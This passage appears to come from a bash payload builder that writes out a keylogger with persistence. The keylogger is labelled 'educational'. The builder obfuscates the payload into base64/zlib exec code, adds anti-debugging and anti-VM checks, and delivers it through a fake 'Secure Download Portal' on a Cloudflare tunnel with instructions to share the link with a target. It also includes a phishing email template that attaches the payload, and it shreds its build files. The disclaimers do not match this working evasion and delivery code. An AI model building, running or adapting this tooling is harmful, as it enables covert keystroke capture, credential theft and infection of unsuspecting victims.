    print("Starting educational keylogger demonstration...")
    print("This will capture keystrokes for educational purposes only.")
    print("Press ESC to stop the keylogger.")
    print("-" * 50)
    
    try:
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()
    except Exception as e:
        print(f"Keylogger error (educational): {e}")
        simulate_keylogger()

def simulate_keylogger():
    print("Simulating keylogger concepts...")
    print("This is an educational demonstration only.")
    print("No actual keylogging is performed.")
    
    sample_keystrokes = [
        "username: admin",
        "password: ********",
        "search: how to learn cybersecurity",
        "email: user@example.com",
        "message: This is educational content"
    ]
    
    for text in sample_keystrokes:
        print(f"\n[SIMULATED] Typing: {text}")
        
        for char in text:
            with buffer_lock:
                keylogger_buffer.append({
                    'key': char,
                    'timestamp': time.time()
                })
            
            send_to_web_interface('keylogger', {
                'keystroke': char,
                'timestamp': time.time()
            })
            
            print(char, end='', flush=True)
            time.sleep(0.1)
        
        print()
        time.sleep(0.5)
    
    print("\nSimulation complete - no actual keys were recorded.")

def save_keylog_buffer():
    if not keylogger_buffer:
        return
    
    try:
        with open("keylog.txt", "w") as f:
            f.write("Educational Keylogger Buffer\n")
            f.write("=" * 40 + "\n")
            
            for entry in keylogger_buffer:
                f.write(f"[{time.ctime(entry['timestamp'])}] {entry['key']}\n")
        
        print(f"\nKeylog buffer saved to keylog.txt ({len(keylogger_buffer)} keystrokes)")
        
        send_to_web_interface('keylogger', {
            'action': 'buffer_saved',
            'keystrokes_count': len(keylogger_buffer),
            'file': 'keylog.txt',
            'status': 'saved'
        })
        
    except Exception as e:
        print(f"Error saving keylog buffer: {e}")

def main():
    setup_persistence()
    
    print("=" * 60)
    print("EDUCATIONAL KEYLOGGER DEMONSTRATION")
    print("=" * 60)
    print("This is an educational demonstration only.")
    print("No actual sensitive data will be captured.")
    print("=" * 60)
    
    if AUTO_EXECUTION:
        print("Auto-execution is enabled for educational purposes.")
        print("In a real scenario, this would start logging on system startup.")
    
    try:
        start_keylogger()
    except:
        print("Real keylogging not available, using simulation...")
        simulate_keylogger()
    
    save_keylog_buffer()
    
    print("\nEducational demonstration complete.")
    time.sleep(3)

if __name__ == "__main__":
    main()
EOF
}

apply_obfuscation() {
    local level=$1
    
    echo -e "${Y}[*] Applying obfuscation level $level...${NC}"
    
    case $level in
        1)
            sed -i.bak -e 's/\bdef \([a-zA-Z_][a-zA-Z0-9_]*\)/def _\1/g' \
                      -e 's/\bclass \([a-zA-Z_][a-zA-Z0-9_]*\)/class _\1/g' \
                      payload.py
            ;;
        2)
            sed -i.bak -e 's/\bdef \([a-zA-Z_][a-zA-Z0-9_]*\)/def _\1/g' \
                      -e 's/\bclass \([a-zA-Z_][a-zA-Z0-9_]*\)/class _\1/g' \
                      -e 's/\([a-zA-Z_][a-zA-Z0-9_]*\) =/\1 =/g' \
                      payload.py
            ;;
        3)
            python3 -c "
import re
with open('payload.py', 'r') as f:
    content = f.read()

def replace_string(match):
    s = match.group(0)
    if s.startswith('f\"') or s.startswith(\"f'\") or '<' in s or '>' in s:
        return s
    if len(s) > 3:
        first_char = s[0]
        inner = s[1:-1]
        if len(inner) > 0:
            return f'{first_char}chr({ord(inner[0])}) + \"{inner[1:]}\"{first_char}'
    return s

content = re.sub(r'(?<!f)(?:\"[^\"]{4,}\")', replace_string, content)
content = re.sub(r'(?<!f)(?:\'[^\']{4,}\')', replace_string, content)

with open('payload.py', 'w') as f:
    f.write(content)"
            ;;
        4)
            python3 -c "
import base64
import zlib

with open('payload.py', 'rb') as f:
    content = f.read()
compressed = zlib.compress(content)
encoded = base64.b64encode(compressed)
with open('payload.py', 'wb') as f:
    f.write(b'import zlib, base64\nexec(zlib.decompress(base64.b64decode(' + encoded + b'))')"
            ;;
        5)
            python3 -c "
import base64
import zlib

with open('payload.py', 'rb') as f:
    content = f.read()
compressed = zlib.compress(content)
encoded = base64.b64encode(compressed)
with open('payload.py', 'wb') as f:
    f.write(b'import zlib, base64\nexec(zlib.decompress(base64.b64decode(b\"' + encoded + b'\")))')"
            ;;
    esac
    
    log_message "INFO" "Obfuscation level $level applied"
}

apply_anti_debug() {
    echo -e "${Y}[*] Applying anti-debugging techniques...${NC}"
    
    cat >> payload.py << 'EOF'

import sys
import os
import time

def check_debugger():
    try:
        debuggers = ['gdb', 'lldb', 'strace', 'ltrace']
        for debugger in debuggers:
            if os.system(f'pgrep -f {debugger} > /dev/null 2>&1') == 0:
                print(f'Debugger detected: {debugger}')
                return True
        return False
    except:
        return False

def check_timing():
    start = time.time()
    time.sleep(0.1)
    end = time.time()
    if (end - start) > 0.15:
        print('Timing anomaly detected')
        return True
    return False

if check_debugger() or check_timing():
    print('Debugging environment detected - exiting')
    sys.exit(0)
EOF
    
    log_message "INFO" "Anti-debugging techniques applied"
}

apply_anti_vm() {
    echo -e "${Y}[*] Applying anti-VM techniques...${NC}"
    
    cat >> payload.py << 'EOF'

def check_vm():
    try:
        vm_indicators = [
            '/proc/vz', '/proc/xen', '/dev/virtio-ports',
            '/sys/class/dmi/id/product_name'
        ]
        
        for indicator in vm_indicators:
            if os.path.exists(indicator):
                with open(indicator, 'r') as f:
                    content = f.read().lower()
                    if any(vm in content for vm in ['vmware', 'virtualbox', 'qemu', 'kvm']):
                        print('Virtualization detected')
                        return True
        
        try:
            import uuid
            mac = uuid.getnode()
            mac_str = ':'.join([f'{(mac >> 8*i) & 0xff:02x}' for i in range(6)])
            if mac_str.startswith(('00:0c:29', '00:1c:14', '08:00:27', '00:50:56')):
                print('VM MAC address detected')
                return True
        except:
            pass
        
        return False
    except:
        return False

if check_vm():
    print('Virtual environment detected - exiting')
    sys.exit(0)
EOF
    
    log_message "INFO" "Anti-VM techniques applied"
}

deliver_payload() {
    local payload_path=$1
    local delivery_method=$2
    local delivery_targets=$3
    
    if [ -z "$delivery_method" ]; then
        log_message "INFO" "No delivery method specified, skipping delivery"
        return 0
    fi
    
    log_message "INFO" "Preparing delivery using method: $delivery_method"
    
    case "$delivery_method" in
        "email")
            deliver_via_email "$payload_path" "$delivery_targets"
            ;;
        "usb")
            deliver_via_usb "$payload_path" "$delivery_targets"
            ;;
        "web")
            deliver_via_web "$payload_path" "$delivery_targets"
            ;;
        "network")
            deliver_via_network "$payload_path" "$delivery_targets"
            ;;
        "social_engineering")
            deliver_via_social_engineering "$payload_path" "$delivery_targets"
            ;;
        "bundle")
            deliver_via_bundling "$payload_path" "$delivery_targets"
            ;;
        "cloudflare_tunnel")
            deliver_via_cloudflare_tunnel "$payload_path" "$delivery_targets"
            ;;
        *)
            log_message "ERROR" "Unknown delivery method: $delivery_method"
            return 1
            ;;
    esac
    
    return $?
}

deliver_via_cloudflare_tunnel() {
    local payload_path=$1
    local local_port=$2
    
    echo -e "${Y}[*] Setting up Cloudflare tunnel delivery...${NC}"
    
    if ! setup_cloudflared; then
        log_message "ERROR" "Failed to setup cloudflared"
        return 1
    fi
    
    local server_script="$TEMP_DIR/server.py"
    cat > "$server_script" << EOF
#!/usr/bin/env python3
from flask import Flask, send_file, render_template_string, request, redirect
import os
import sys

app = Flask(__name__)

@app.route('/')
def index():
    if request.path == '/':
        return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <title>Secure Download Portal</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 30px; }
        .download-btn { display: inline-block; background-color: #4285f4; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-size: 18px; margin: 20px 0; }
        .download-btn:hover { background-color: #3367d6; }
        .info { background-color: #e8f0fe; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .footer { text-align: center; margin-top: 30px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Secure Download Portal</h1>
            <p>Download your secure files</p>
        </div>
        <div class="info">
            <h3>File Information</h3>
            <p><strong>Filename:</strong> $(basename "$payload_path")</p>
            <p><strong>Size:</strong> $(stat -f%z "$payload_path" 2>/dev/null || stat -c%s "$payload_path") bytes</p>
            <p><strong>Type:</strong> Secure Executable</p>
            <p><strong>Auto-Execution:</strong> $([ "$AUTO_EXECUTION" = true ] && echo "Enabled" || echo "Disabled")</p>
            <p><strong>Web Interface:</strong> $([ "$WEB_INTERFACE_ENABLED" = true ] && echo "Enabled" || echo "Disabled")</p>
        </div>
        <div style="text-align: center;">
            <a href="/download" class="download-btn">Download File</a>
        </div>
        <div class="footer">
            <p>This is a secure download portal. All downloads are logged.</p>
            <p>&copy; $(date +%Y) Secure Downloads</p>
        </div>
    </div>
</body>
</html>
''')
    else:
        return redirect('/download')

@app.route('/download')
def download():
    payload_path = "$payload_path"
    if os.path.exists(payload_path):
        return send_file(payload_path, as_attachment=True, download_name="$(basename "$payload_path")")
    return "File not found", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=$local_port, debug=False)
EOF
    
    chmod +x "$server_script"
    
    echo -e "${Y}[*] Starting HTTP server on port $local_port...${NC}"
    python3 "$server_script" &
    local server_pid=$!
    
    sleep 3
    
    if start_cloudflare_tunnel "$local_port" "$TEMP_DIR"; then
        echo -e "${G}[+] Cloudflare tunnel established successfully!${NC}"
        echo -e "${G}[+] Secure download URL: $CLOUDFLARE_TUNNEL_URL${NC}"
        
        if command -v qrencode &> /dev/null; then
            echo -e "${Y}[*] Generating QR code for download URL...${NC}"
            qrencode -t ANSI "$CLOUDFLARE_TUNNEL_URL"
        fi
        
        local tunnel_info="$DELIVERY_DIR/cloudflare_tunnel_info.txt"
        cat > "$tunnel_info" << EOF
CLOUDFLARE TUNNEL INFORMATION
=============================
Tunnel URL: $CLOUDFLARE_TUNNEL_URL
Direct Download Link: $CLOUDFLARE_TUNNEL_URL/download
Local Port: $local_port
Server PID: $server_pid
Tunnel PID: $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
Start Time: $(date)
Payload: $(basename "$payload_path")
Auto-Execution: $AUTO_EXECUTION
Web Interface: $WEB_INTERFACE_ENABLED

Usage:
1. Share the tunnel URL with your target
2. Target can download the payload securely using: $CLOUDFLARE_TUNNEL_URL/download
3. All traffic is encrypted through Cloudflare

To stop the tunnel:
kill $server_pid
kill $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
EOF
        
        echo -e "${G}[+] Tunnel information saved to: $tunnel_info${NC}"
        echo -e "${G}[+] Direct download link: $CLOUDFLARE_TUNNEL_URL/download${NC}"
        
        echo -e "\n${Y}[*] Tunnel is now running. Press Ctrl+C to stop the tunnel.${NC}"
        echo -e "${Y}[*] Or run the following commands to stop it:${NC}"
        echo -e "${Y}    kill $server_pid${NC}"
        echo -e "${Y}    kill $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")${NC}"
        
        trap 'stop_cloudflare_tunnel; kill $server_pid 2>/dev/null; exit' INT
        while true; do
            sleep 1
        done
    else
        kill $server_pid 2>/dev/null
        log_message "ERROR" "Failed to establish Cloudflare tunnel"
        return 1
    fi
}

deliver_via_email() {
    local payload_path=$1
    local recipients=$2
    
    echo -e "${Y}[*] Preparing email delivery...${NC}"
    
    local email_template="$DELIVERY_DIR/email_template.html"
    local subject="Important Document - Please Review"
    
    cat > "$email_template" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Important Document</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #f2f2f2; padding: 10px; text-align: center; }
        .content { margin-top: 20px; }
        .footer { margin-top: 30px; font-size: 12px; color: #777; }
    </style>
</head>
<body>
    <div class="header">
        <h2>Important Document</h2>
    </div>
    <div class="content">
        <p>Dear recipient,</p>
        <p>Please find attached an important document that requires your immediate attention.</p>
        <p>This document contains critical information that needs to be reviewed by the end of business day.</p>
        <p>Thank you for your cooperation.</p>
        <p>Best regards,<br>Administrative Department</p>
    </div>
    <div class="footer">
        <p>This email and any attachments are confidential and intended solely for the use of the individual or entity to whom they are addressed.</p>
    </div>
</body>
</html>
EOF
    
    local email_script="$DELIVERY_DIR/send_email.py"
    cat > "$email_script" << EOF
#!/usr/bin/env python3
import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import sys

def send_email(recipient, payload_path, template_path):
    sender_email = "admin@example.com"
    password = "password"
    
    message = MIMEMultipart("alternative")
    message["Subject"] = "$subject"
    message["From"] = sender_email
    message["To"] = recipient
    
    with open(template_path, "r") as f:
        html_content = f.read()
    
    html_part = MIMEText(html_content, "html")
    message.attach(html_part)
    
    with open(payload_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    
    encoders.encode_base64(part)
    
    filename = payload_path.split("/")[-1]
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    
    message.attach(part)
    
    print(f"Email prepared for {recipient}")
    print(f"Subject: {message['Subject']}")
    print(f"Attachment: {filename}")
    print("This is an educational template - no actual emails are sent")
    
    return True

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 send_email.py <recipient> <payload_path>")
        sys.exit(1)
    
    recipient = sys.argv[1]
    payload_path = sys.argv[2]
    template_path = sys.argv[3] if len(sys.argv) > 3 else "$email_template"
    
    send_email(recipient, payload_path, template_path)
EOF
    
    chmod +x "$email_script"
    
    IFS=',' read -ra RECIPIENTS <<< "$recipients"
    for recipient in "${RECIPIENTS[@]}"; do
        recipient=$(echo "$recipient" | xargs)
        if [ -n "$recipient" ]; then
            echo -e "${Y}[*] Preparing email for $recipient...${NC}"
            python3 "$email_script" "$recipient" "$payload_path" "$email_template"
        fi
    done
    
    log_message "SUCCESS" "Email delivery preparation completed"
    return 0
}

cleanup() {
    log_message "INFO" "Performing cleanup..."
    
    if [ -f "$TEMP_DIR/web_interface.pid" ]; then
        local web_pid=$(cat "$TEMP_DIR/web_interface.pid")
        if kill -0 "$web_pid" 2>/dev/null; then
            kill "$web_pid"
            log_message "INFO" "Web interface stopped"
        fi
        rm -f "$TEMP_DIR/web_interface.pid"
    fi
    
    stop_cloudflare_tunnel
    
    cd ..
    
    if [ "$KEEP_BUILD_FILES" != "true" ]; then
        if [ -d "$WORK_DIR" ]; then
            if command -v shred &> /dev/null; then
                find "$WORK_DIR" -type f -exec shred -vfz -n 3 {} \;
            fi
            rm -rf "$WORK_DIR"
            log_message "INFO" "Removed temporary build files"
        fi
    else
        log_message "INFO" "Keeping temporary build files as requested"
    fi
    
    if [ -d "$TEMP_DIR" ]; then
        if command -v shred &> /dev/null; then
            find "$TEMP_DIR" -type f -exec shred -vfz -n 3 {} \;
        fi
        rm -rf "$TEMP_DIR"
    fi
    
    deactivate 2>/dev/null || true
    
    log_message "SUCCESS" "Cleanup complete"
}

init() {
    trap cleanup EXIT
    
    init_logging
    display_banner
    check_dependencies
    
    if ! load_config; then
        log_message "INFO" "No existing configuration found, using defaults"
    fi
}

main() {
    init
    
    get_configuration
    setup_environment
    
    if [ "$WEB_INTERFACE_ENABLED" = true ]; then
        start_web_interface
    fi
    
    if generate_payload "$PAYLOAD_TYPE" "$ATTACKER_IP" "$ATTACKER_PORT" "$TARGET_OS" "$FINAL_NAME"; then
        if [ "$TARGET_OS" == "Cross-platform" ]; then
            echo -e "${G}>> CROSS-PLATFORM PAYLOAD GENERATION COMPLETE. Check the 'cross_platform_builds' directory.${NC}"
            echo -e "${G}>> Use launcher.sh (Unix) or launcher.bat (Windows) for deployment.${NC}"
            if [ "$AUTO_EXECUTION" = true ]; then
                echo -e "${G}>> Auto-execution is ENABLED - payload will run automatically on installation.${NC}"
            else
                echo -e "${Y}>> Auto-execution is DISABLED - payload requires manual execution.${NC}"
            fi
            if [ "$WEB_INTERFACE_ENABLED" = true ]; then
                echo -e "${G}>> Web interface is ENABLED - access results at http://$ATTACKER_IP:$WEB_PORT${NC}"
            fi
            log_message "SUCCESS" "Cross-platform payload generation completed successfully"
        else
            echo -e "${G}>> PAYLOAD GENERATION COMPLETE. Check the parent directory for '$FINAL_NAME'.${NC}"
            echo -e "${G}>> Metadata saved as '${FINAL_NAME}.meta'${NC}"
            if [ "$AUTO_EXECUTION" = true ]; then
                echo -e "${G}>> Auto-execution is ENABLED - payload will run automatically on installation.${NC}"
            else
                echo -e "${Y}>> Auto-execution is DISABLED - payload requires manual execution.${NC}"
            fi
            if [ "$WEB_INTERFACE_ENABLED" = true ]; then
                echo -e "${G}>> Web interface is ENABLED - access results at http://$ATTACKER_IP:$WEB_PORT${NC}"
            fi
            log_message "SUCCESS" "Payload generation completed successfully"
        fi
        
        if [ -n "$DELIVERY_METHOD" ]; then
            local payload_full_path
            if [ "$TARGET_OS" == "Cross-platform" ]; then
                payload_full_path="$(pwd)/../cross_platform_builds"
            else
                payload_full_path="$(pwd)/../$FINAL_NAME"
            fi
            
            if deliver_payload "$payload_full_path" "$DELIVERY_METHOD" "$DELIVERY_TARGETS"; then
                echo -e "${G}>> DELIVERY COMPLETE.${NC}"
                log_message "SUCCESS" "Payload delivery completed successfully"
            else
                echo -e "${R}>> DELIVERY FAILED.${NC}"
                log_message "ERROR" "Payload delivery failed"
            fi
        fi
    else
        echo -e "${R}>> PAYLOAD GENERATION FAILED.${NC}"
        log_message "ERROR" "Payload generation failed"
    fi
}

main "$@"
